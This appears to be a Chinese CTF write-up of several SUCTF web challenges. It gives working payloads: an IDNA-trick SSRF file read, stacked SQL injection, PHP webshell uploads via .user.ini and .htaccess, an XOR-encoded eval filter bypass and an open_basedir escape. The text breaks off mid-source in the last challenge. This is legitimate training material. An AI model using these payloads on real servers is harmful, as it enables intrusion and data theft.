<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">getUrl?url&#x3D;file:&#x2F;&#x2F;&#x2F;&#x2F;suctf.cc&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    location &#x2F; &#123;</span><br><span class="line">        try_files $uri @app;</span><br><span class="line">    &#125;</span><br><span class="line">    location @app &#123;</span><br><span class="line">        include uwsgi_params;</span><br><span class="line">        uwsgi_pass unix:&#x2F;&#x2F;&#x2F;tmp&#x2F;uwsgi.sock;</span><br><span class="line">    &#125;</span><br><span class="line">    location &#x2F;static &#123;</span><br><span class="line">        alias &#x2F;app&#x2F;static;</span><br><span class="line">    &#125;</span><br><span class="line">    # location &#x2F;flag &#123;</span><br><span class="line">    #     alias &#x2F;usr&#x2F;fffffflag;</span><br><span class="line">    # &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>提示flag再 /usr/fffffflag 中</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">getUrl?url&#x3D;file:&#x2F;&#x2F;&#x2F;&#x2F;suctf.cc&#x2F;usr&#x2F;fffffflag</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;b692ca82-8292-4582-846a-286b3743f697&#125;</span><br></pre></td></tr></table></figure>



<p><strong>预期解</strong><br>black hat 上的所展示的部分字符<br><img src="/pic/69.png" alt=""></p>
<p>Altman师傅写的脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># coding:utf-8 </span><br><span class="line">for i in range(128,65537):    </span><br><span class="line">    tmp&#x3D;chr(i)    </span><br><span class="line">    try:        </span><br><span class="line">        res &#x3D; tmp.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;)        </span><br><span class="line">        if(&quot;-&quot;) in res:            </span><br><span class="line">            continue        </span><br><span class="line">        print(&quot;U:&#123;&#125;    A:&#123;&#125;      ascii:&#123;&#125; &quot;.format(tmp, res, i))    </span><br><span class="line">    except:        </span><br><span class="line">        pass</span><br></pre></td></tr></table></figure>


<p>可以使用<strong>U+2102，ℂ</strong>代替c，或者<strong>U+2106, ℆</strong>代替c/u</p>
<p>读取网站配置文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">getUrl?url&#x3D;file:&#x2F;&#x2F;&#x2F;&#x2F;suctf.ℂℂ&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf</span><br><span class="line">或者</span><br><span class="line">getUrl?url&#x3D;file:&#x2F;&#x2F;&#x2F;&#x2F;suctf.c℆usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf</span><br></pre></td></tr></table></figure>

<p>读取flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;getUrl?url&#x3D;file:&#x2F;&#x2F;suctf.cℂ&#x2F;usr&#x2F;fffffflag</span><br><span class="line">或者</span><br><span class="line">getUrl?url&#x3D;file:&#x2F;&#x2F;&#x2F;&#x2F;suctf.c℆usr&#x2F;fffffflag</span><br></pre></td></tr></table></figure>



<h2 id="EasySQL"><a href="#EasySQL" class="headerlink" title="EasySQL"></a>EasySQL</h2><p>拿到题目是一个输入框，post类型提交</p>
<p>先fuzz一遍，以下关键字被过滤</p>
<p><img src="/pic/68.png" alt=""></p>
<p><strong>非预期解</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">*,1</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Array ( [0] &#x3D;&gt; flag&#123;36c7b843-6efb-409d-a1fe-3ef54fce7d6d&#125; [1] &#x3D;&gt; 1 )</span><br></pre></td></tr></table></figure>



<p><strong>预期解</strong></p>
<p>根据测试发现输入长度最大为40个字符</p>
<p>还发现存在堆叠注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1;show databases;#</span><br><span class="line"> </span><br><span class="line">Array ( [0] &#x3D;&gt; 1 ) Array ( [0] &#x3D;&gt; ctf ) Array ( [0] &#x3D;&gt; ctftraining ) Array ( [0] &#x3D;&gt; information_schema ) Array ( [0] &#x3D;&gt; mysql ) Array ( [0] &#x3D;&gt; performance_schema ) Array ( [0] &#x3D;&gt; test )</span><br></pre></td></tr></table></figure>

<p>经过测试查询语句应该类似于</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select $_POST[&#39;query&#39;] || flag ...</span><br></pre></td></tr></table></figure>

<p>关于<a href="https://mariadb.com/kb/en/sql-mode/" target="_blank" rel="noopener">sql_mod</a></p>
<p>当设置sql_mode=<strong>PIPES_AS_CONCAT</strong>时，将”||”视为字符串的连接操作符而非或运算符，这和 Oracle 数据库是一样的，也和字符串的拼接函数 Concat 相类似</p>
<p>所以payload为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1;set sql_mode&#x3D;PIPES_AS_CONCAT;select 1</span><br></pre></td></tr></table></figure>

<p>返结果为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Array ( [0] &#x3D;&gt; 1 ) Array ( [0] &#x3D;&gt; 1flag&#123;36c7b843-6efb-409d-a1fe-3ef54fce7d6d&#125; )</span><br></pre></td></tr></table></figure>



<h2 id="CheckIn"><a href="#CheckIn" class="headerlink" title="CheckIn"></a>CheckIn</h2><p>先直接上传图片马，提示文件内容包含<code>&lt;?</code>，采用js的写法绕过</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script language=<span class="string">"php"</span>&gt; </span><br><span class="line"><span class="built_in">eval</span>($_POST[cmd]);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>改后缀为PHP、PHP2、PHP3、PHP4、PHP5、Phtml，发现都被过滤</p>
<p>php有一个文件是<a href="https://www.php.net/manual/zh/configuration.file.per-user.php" target="_blank" rel="noopener">.user.ini</a>    <a href="[https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html](https://wooyun.js.org/drops/user.ini文件构成的PHP后门.html)">参考连接</a></p>
<p><img src="/pic/70" alt=""></p>
<p>先上传一个图片马</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="fileUpload"; filename="1.gif"</span><br><span class="line"><span class="attribute">Content-Type</span>: image/gif</span><br><span class="line"></span><br><span class="line"><span class="attribute">GIF89a</span></span><br><span class="line">&lt;script language="php"&gt; </span><br><span class="line"><span class="attribute">eval($_POST[cmd]);</span></span><br><span class="line"><span class="attribute">&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>上传.htaccess发现没有生效，然后上传.user.ini</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;fileUpload&quot;; filename&#x3D;&quot;1.gif&quot;</span><br><span class="line">Content-Type: image&#x2F;gif</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">auto_prepend_file&#x3D;1.gif</span><br></pre></td></tr></table></figure>

<p>auto_prepend_file=1.gif  相当于文件夹下所有文件都包含1.gif</p>
<p>返回信息</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Upload Labs<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Upload Labs<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"index.php"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"file"</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"fileUpload"</span> <span class="attr">id</span>=<span class="string">"file"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"upload"</span> <span class="attr">value</span>=<span class="string">"提交"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line">Your dir uploads/2c67ca1eaeadbdc1868d67003072b481 <span class="tag">&lt;<span class="name">br</span>&gt;</span>Your files : <span class="tag">&lt;<span class="name">br</span>&gt;</span>array(5) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(1) "."</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(2) ".."</span><br><span class="line">  [2]=&gt;</span><br><span class="line">  string(9) ".user.ini"</span><br><span class="line">  [3]=&gt;</span><br><span class="line">  string(5) "1.gif"</span><br><span class="line">  [4]=&gt;</span><br><span class="line">  string(9) "index.php"</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用蚁剑连接<code>host/uploads/2c67ca1eaeadbdc1868d67003072b481/index.php</code>即可</p>
<p><img src="/pic/71.png" alt=""></p>
<h2 id="EasyWeb"><a href="#EasyWeb" class="headerlink" title="EasyWeb"></a>EasyWeb</h2><p>打开题目就是源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_the_flag</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class="line">    $userdir = <span class="string">"upload/tmp_"</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!file_exists($userdir))&#123;</span><br><span class="line">    mkdir($userdir);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">"file"</span>]))&#123;</span><br><span class="line">        $tmp_name = $_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>];</span><br><span class="line">        $name = $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">        $extension = substr($name, strrpos($name,<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/ph/i"</span>,$extension)) <span class="keyword">die</span>(<span class="string">"^_^"</span>); </span><br><span class="line">        <span class="keyword">if</span>(mb_strpos(file_get_contents($tmp_name), <span class="string">'&lt;?'</span>)!==<span class="keyword">False</span>) <span class="keyword">die</span>(<span class="string">"^_^"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!exif_imagetype($tmp_name)) <span class="keyword">die</span>(<span class="string">"^_^"</span>); </span><br><span class="line">        $path= $userdir.<span class="string">"/"</span>.$name;</span><br><span class="line">        @move_uploaded_file($tmp_name, $path);</span><br><span class="line">        print_r($path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$hhh = @$_GET[<span class="string">'_'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$hhh)&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen($hhh)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'One inch long, one inch strong!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span>, $hhh) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Try something else!'</span>);</span><br><span class="line"></span><br><span class="line">$character_type = count_chars($hhh, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($character_type)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">"Almost there!"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>($hhh);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>首先要绕过长度，然后是绕过正则。</p>
<p>绕过长度可以新建一个变量，可以使用异或或者非运算绕过。（~操作要比异或简单，但是被禁用，可以使用异或运算模拟非运算）</p>
<p>异或构造$<em>GET[‘\</em>‘]</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo urlencode(urldecode(&quot;%ff%ff%ff%ff&quot;)^&quot;_GET&quot;); &#x2F;&#x2F;%A0%B8%BA%AB</span><br></pre></td></tr></table></figure>

<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?_&#x3D;$&#123;%FF%FF%FF%FF^%A0%B8%BA%AB&#125;&#123;%ff&#125;();&amp;%ff&#x3D;phpinfo</span><br></pre></td></tr></table></figure>

<p>查看phpinfo禁用了如下函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail</span><br></pre></td></tr></table></figure>

<p>还设置了<code>open_basedir</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">open_basedir	&#x2F;var&#x2F;www&#x2F;html&#x2F;:&#x2F;tmp&#x2F;</span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_the_flag</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class="line">    $userdir = <span class="string">"upload/tmp_"</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!file_exists($userdir))&#123;</span><br><span class="line">    mkdir($userdir);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">"file"</span>]))&#123;</span><br><span class="line">        $tmp_name = $_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>];</span><br><span class="line">        $name = $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">        $extension = substr($name, strrpos($name,<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/ph/i"</span>,$extension)) <span class="keyword">die</span>(<span class="string">"^_^"</span>); </span><br><span class="line">        <span class="keyword">if</span>(mb_strpos(file_get_contents($tmp_name), <span class="string">'&lt;?'</span>)!==<span class="keyword">False</span>) <span class="keyword">die</span>(<span class="string">"^_^"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!exif_imagetype($tmp_name)) <span class="keyword">die</span>(<span class="string">"^_^"</span>); </span><br><span class="line">        $path= $userdir.<span class="string">"/"</span>.$name;</span><br><span class="line">        @move_uploaded_file($tmp_name, $path);</span><br><span class="line">        print_r($path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>strrpos(要被检查的字符串,要搜索的字符串) :返回文件最后出现的位置</p>
<p>mb_strpos(要被检查的字符串,要搜索的字符串)：返回要查找的字符串在别一个字符串中首次出现的位置</p>
<p>此函数大致意思是文件内容不能包含&lt;?，上传的文件要经过exif_imagetype（）检测</p>
<p>使用payload上传文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?_&#x3D;$&#123;%FF%FF%FF%FF^%A0%B8%BA%AB&#125;&#123;%ff&#125;();&amp;%ff&#x3D;get_the_flag</span><br></pre></td></tr></table></figure>

<p>.htaccess</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#define height 12</span><br><span class="line">#define width 12</span><br><span class="line">AddType application&#x2F;x-httpd-php .cc</span><br><span class="line">php_value auto_append_file &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;1.cc&quot;</span><br></pre></td></tr></table></figure>

<p>1.cc</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GIF89a00PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs&#x2F;Pg&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>

<p>GIF89a与后面加密过的一句话不能使用空格或者回车隔开,因为base64解密文件时会出错，00可以修改为base64中允许出现的任意两个字符，此服务器版本为7.0+无法使用JS写法绕过&lt;?</p>
<p><a href="https://www.cnblogs.com/cimuhuashuimu/p/11544487.html" target="_blank" rel="noopener">绕过open_basedir参考文章</a></p>
<p>绕过payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chdir(&#39;img&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);echo(file_get_contents(&#39;flag&#39;));&#96;</span><br></pre></td></tr></table></figure>



<p>先扫描目录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;upload&#x2F;tmp_2c67ca1eaeadbdc1868d67003072b481&#x2F;1.cc</span><br></pre></td></tr></table></figure>

<p>post内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cmd&#x3D;chdir(&#39;img&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);var_dump(scandir(&#39;&#x2F;&#39;));</span><br></pre></td></tr></table></figure>

<p>返回内容</p>
<p><img src="/pic/72.png" alt=""></p>
<p>找到flag，读取flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cmd&#x3D;chdir(&#39;img&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);var_dump(file(&#39;&#x2F;THis_Is_tHe_F14g&#39;));</span><br></pre></td></tr></table></figure>

<p><img src="/pic/73.png" alt=""></p>
<h2 id="Upload-Labs-2"><a href="#Upload-Labs-2" class="headerlink" title="Upload Labs 2"></a>Upload Labs 2</h2><p>给出了源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//admin.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'config.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ad</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $cmd;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $clazz;</span><br><span class="line">    <span class="keyword">public</span> $func1;</span><br><span class="line">    <span class="keyword">public</span> $func2;</span><br><span class="line">    <span class="keyword">public</span> $func3;</span><br><span class="line">    <span class="keyword">public</span> $instance;</span><br><span class="line">    <span class="keyword">public</span> $arg1;</span><br><span class="line">    <span class="keyword">public</span> $arg2;</span><br><span class="line">    <span class="keyword">public</span> $arg3;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($cmd, $clazz, $func1, $func2, $func3, $arg1, $arg2, $arg3)</span></span>&#123;  <span class="comment">//构造类时调用的方法</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;cmd = $cmd;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;clazz = $clazz;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;func1 = $func1;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;func2 = $func2;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;func3 = $func3;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;arg1 = $arg1;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;arg2 = $arg2;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;arg3 = $arg3;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        $reflect = <span class="keyword">new</span> ReflectionClass(<span class="keyword">$this</span>-&gt;clazz);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;instance = $reflect-&gt;newInstanceArgs();  <span class="comment">//实例化clazz类</span></span><br><span class="line"></span><br><span class="line">        $reflectionMethod = <span class="keyword">new</span> ReflectionMethod(<span class="keyword">$this</span>-&gt;clazz, <span class="keyword">$this</span>-&gt;func1);</span><br><span class="line">        $reflectionMethod-&gt;invoke(<span class="keyword">$this</span>-&gt;instance, <span class="keyword">$this</span>-&gt;arg1); <span class="comment">//执行clazz中的func1方法，参数为arg1</span></span><br><span class="line"></span><br><span class="line">        $reflectionMethod = <span class="keyword">new</span> ReflectionMethod(<span class="keyword">$this</span>-&gt;clazz, <span class="keyword">$this</span>-&gt;func2);</span><br><span class="line">        $reflectionMethod-&gt;invoke(<span class="keyword">$this</span>-&gt;instance, <span class="keyword">$this</span>-&gt;arg2);<span class="comment">//执行clazz中的func2方法，参数为arg2</span></span><br><span class="line"></span><br><span class="line">        $reflectionMethod = <span class="keyword">new</span> ReflectionMethod(<span class="keyword">$this</span>-&gt;clazz, <span class="keyword">$this</span>-&gt;func3);</span><br><span class="line">        $reflectionMethod-&gt;invoke(<span class="keyword">$this</span>-&gt;instance, <span class="keyword">$this</span>-&gt;arg3);</span><br><span class="line">    &#125; <span class="comment">//执行clazz中的func3方法，参数为arg3</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;  <span class="comment">//析构类调用的方法</span></span><br><span class="line">        system(<span class="keyword">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>] == <span class="string">'127.0.0.1'</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'admin'</span>]))&#123;</span><br><span class="line">        $cmd = $_POST[<span class="string">'cmd'</span>];</span><br><span class="line"></span><br><span class="line">        $clazz = $_POST[<span class="string">'clazz'</span>];</span><br><span class="line">        $func1 = $_POST[<span class="string">'func1'</span>];</span><br><span class="line">        $func2 = $_POST[<span class="string">'func2'</span>];</span><br><span class="line">        $func3 = $_POST[<span class="string">'func3'</span>];</span><br><span class="line">        $arg1 = $_POST[<span class="string">'arg1'</span>];</span><br><span class="line">        $arg2 = $_POST[<span class="string">'arg2'</span>];</span><br><span class="line">        $arg2 = $_POST[<span class="string">'arg3'</span>];</span><br><span class="line">        $admin = <span class="keyword">new</span> Ad($cmd, $clazz, $func1, $func2, $func3, $arg1, $arg2, $arg3);</span><br><span class="line">        $admin-&gt;check();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"You r not admin!"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://www.jianshu.com/p/d02cbde1cdd7" target="_blank" rel="noopener">关于PHP反射类</a></p>
<p>大致意思就是要构造ssrf进行命令执行。SoapClient可以构造http请求。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// func.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'class.php'</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">"submit"</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">"url"</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/^(ftp|zlib|data|glob|phar|ssh2|compress.bzip2|compress.zlib|rar|ogg|expect)(.|\\s)*|(.|\\s)*(file|data|\.\.)(.|\\s)*/i'</span>,$_POST[<span class="string">'url'</span>]))&#123;  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Go away!"</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $file_path = $_POST[<span class="string">'url'</span>];</span><br><span class="line">        $file = <span class="keyword">new</span> File($file_path);</span><br><span class="line">        $file-&gt;getMIME();</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Your file type is '$file' &lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>传入的url要经过正则匹配，调用file类</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// class.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'config.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $file_name;</span><br><span class="line">    <span class="keyword">public</span> $type;</span><br><span class="line">    <span class="keyword">public</span> $func = <span class="string">"Check"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file_name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file_name = $file_name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $class = <span class="keyword">new</span> ReflectionClass(<span class="keyword">$this</span>-&gt;func);</span><br><span class="line">        $a = $class-&gt;newInstanceArgs(<span class="keyword">$this</span>-&gt;file_name);</span><br><span class="line">        $a-&gt;check();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getMIME</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $finfo = finfo_open(FILEINFO_MIME_TYPE);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;type = finfo_file($finfo, <span class="keyword">$this</span>-&gt;file_name);</span><br><span class="line">        finfo_close($finfo);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;type;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Check</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $file_name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file_name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file_name = $file_name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $data = file_get_contents(<span class="keyword">$this</span>-&gt;file_name);</span><br><span class="line">        <span class="keyword">if</span> (mb_strpos($data, <span class="string">"&lt;?"</span>) !== <span class="keyword">FALSE</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"&amp;lt;? 